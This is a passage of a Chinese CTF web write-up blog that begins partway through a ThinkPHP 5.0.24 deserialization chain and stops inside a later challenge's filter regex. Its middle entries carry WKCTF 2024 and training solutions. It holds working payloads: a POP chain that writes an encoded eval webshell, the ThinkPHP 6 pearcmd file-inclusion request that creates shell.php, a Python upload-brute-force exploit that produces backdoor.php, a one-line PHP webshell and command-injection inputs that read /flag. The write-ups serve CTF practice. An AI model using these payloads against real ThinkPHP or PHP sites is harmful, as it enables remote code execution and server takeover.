class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$model</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="variable">$model</span>; <span class="comment">//$this-&gt;model=&gt; think\console\Output;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle =<span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="variable">$handle</span>; <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span>=<span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=[</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">3600</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">Memcached</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>(<span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$Output</span>,<span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$window</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打入payload, 会在目录下生成一个php文件<br><img src="/2024/08/02/tp-V5.0.24/image-20240802013652457.png" alt="image-20240802013652457"></p><p>访问相应的文件<br><img src="/2024/08/02/tp-V5.0.24/image-20240802013825154.png" alt="image-20240802013825154"></p><p><a href="https://xz.aliyun.com/t/8143?time__1311=n4+xnD0Dc7GQDt5itD/iW4BIFTxI2TM2DeTD#toc-12">https://xz.aliyun.com/t/8143?time__1311=n4%2BxnD0Dc7GQDt5itD%2FiW4BIFTxI2TM2DeTD#toc-12</a><br><a href="https://www.cnblogs.com/seizer/p/17035791.html">https://www.cnblogs.com/seizer/p/17035791.html</a><br><a href="https://www.cnblogs.com/Yhck/p/15616884.html">https://www.cnblogs.com/Yhck/p/15616884.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WKCTF 2024 ---Web</title>
      <link href="/2024/07/17/WKCTF%202024/"/>
      <url>/2024/07/17/WKCTF%202024/</url>
      
        <content type="html"><![CDATA[<h3 id="qiandao"><a href="#qiandao" class="headerlink" title="qiandao"></a>qiandao</h3><p>简单的文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">提示说了flag在根目录下 ,直接利用php://filter 伪协议读文件</span><br><span class="line"></span><br><span class="line">?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=/flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h3><p>ThinkPHP V6.0.12LTS<br>QVD-2022-46174<br>开启了多语言功能, 且存在 pear 扩展 , 通过lang参数和目录穿越实现文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcm</span><br><span class="line">d&amp;/&lt;?=phpinfo()?&gt;+/var/www/html/shell.php</span><br></pre></td></tr></table></figure><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p>官方给的wp<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">burpPNG</span>():</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8081/&quot;</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;./backdoor.png&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./backdoor.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line">    session.post(url=url, files=file)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>, <span class="number">100000</span>):</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;上传的png图片：<span class="subst">&#123;url&#125;</span><span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">burpMSL</span>():</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8081/&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">        session = requests.session()</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;i&#125;</span>.msl&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;上传的msl文件：<span class="subst">&#123;url&#125;</span><span class="subst">&#123;i&#125;</span>.msl&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_mslfile</span>(<span class="params">fileNum</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:8081/&quot;</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    content = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;image&gt;</span></span><br><span class="line"><span class="string">&lt;read filename=&quot;./<span class="subst">&#123;fileNum&#125;</span>.png&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;write filename=&quot;./backdoor.php&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/image&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;backdoor.msl&quot;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(content)</span><br><span class="line">        file.close()</span><br><span class="line">        file = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;./backdoor.msl&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;./backdoor.msl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line">        session.post(url=url, files=file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getShell</span>(<span class="params">fileNum</span>):</span><br><span class="line">    content=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">为避免服务器误判为攻击，尝试访问如下地址:</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/?backdoor=msl:./<span class="subst">&#123;fileNum&#125;</span>.msl</span></span><br><span class="line"><span class="string">然后getshell地址为：</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/backdoor.php?a=xxxxx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fileNUM=burpPNG()</span><br><span class="line">    create_mslfile(fileNUM)</span><br><span class="line">    mslNum=burpMSL()</span><br><span class="line">    getShell(mslNum)</span><br></pre></td></tr></table></figure><p>(环境崩了, 打不开, 分析一下代码作为复现了)<br>上传图片, 但是题目不会回显出上传的文件的路劲, 需要去爆破</p><p> 为什么是  <code>for i in range(10000, 100000):</code>  应该是一般的上传文件的处理, 对上传的文件使用 随机数 进行重命名, 所以根据这个来爆破出文件路径<br>同理对上传的 msl文件 进行爆破路径 </p><p>msl⽂件的写法: </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;./&#123;fileNum&#125;.png&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;./backdoor.php&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将爆破得到 的png图片的路径 里面的内容写入到 backdoor.php<br>(可以理解为改了个后缀, 以便能够执行 php代码 , 执行所想要的命令)</p><p>png图片里面的内容 应该就是一句话木马了(如果会做一些内容检查的话 ,应该就是一些常规的绕过了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>给了提示: twinhex<br>搜索一下可以发现是一种加密方式<br><a href="https://github.com/htr-tech/0xTwin">https://github.com/htr-tech/0xTwin</a><br>有相应的工具</p><p>下载运行<br>python twin_cipher.py -d “文件给的一长串字符”</p><p>运行后是一串base64密文 , 是由一张图片转成的base64<br>将base64转成图片可以得到一张二维码. 扫描之后 : 请发送 WKCTF2024 到微信公众号隐雾安全获取flag！</p><p>最后得到的flag:   WKCTF{hello_2024}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>交流练习——week2--web</title>
      <link href="/2024/06/16/%E4%BA%A4%E6%B5%81%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94week2--web/"/>
      <url>/2024/06/16/%E4%BA%A4%E6%B5%81%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94week2--web/</url>
      
        <content type="html"><![CDATA[<h3 id="EZser"><a href="#EZser" class="headerlink" title="EZser"></a>EZser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$c</span>,<span class="variable">$d</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="variable">$c</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d=<span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;b === <span class="variable language_">$this</span>-&gt;a) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;gogogo&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aa</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aa=<span class="variable">$aa</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aa-&gt;<span class="title function_ invoke__">hhh</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;youaregood&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wowowo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aaa</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aaa=<span class="variable">$aaa</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aaa-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;xpw&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;xpw&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一道php反序列化的题目<br>主要是绕过 <code>$this-&gt;b === $this-&gt;a</code>  但是a的值是未知的的，所以通过&amp;符号使b指向a的地址，从而使他们相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$c</span> = <span class="literal">null</span>, <span class="variable">$d</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aa</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aa = <span class="variable">$aa</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wowowo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$aaa</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aaa = <span class="variable">$aaa</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hello</span>(<span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>(<span class="keyword">new</span> <span class="title function_ invoke__">wowowo</span>(<span class="keyword">new</span> <span class="title function_ invoke__">hello</span>())), <span class="string">&#x27;Admin&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;b = &amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:5:&quot;hello&quot;:4:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:1:&#123;s:2:&quot;aa&quot;;O:6:&quot;wowowo&quot;:1:&#123;s:3:&quot;aaa&quot;;O:5:&quot;hello&quot;:4:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;s:1:&quot;c&quot;;N;s:1:&quot;d&quot;;N;&#125;&#125;&#125;s:1:&quot;d&quot;;s:5:&quot;Admin&quot;;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="简简单单"><a href="#简简单单" class="headerlink" title="简简单单"></a>简简单单</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>]))</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;LANG=zh_TW.utf8&#x27;</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&quot;data&quot;</span>].<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="subst">$action</span> <span class="subst">$data</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$output</span>;    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要闭合单引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post传参:</span><br><span class="line">action=system&amp;data=&#x27;;cat /flag;&#x27;</span><br><span class="line">或者</span><br><span class="line">action=||&amp;data=&#x27;cat /flag&#x27;</span><br></pre></td></tr></table></figure><h3 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strCheck</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|\&amp;|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i&quot;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span 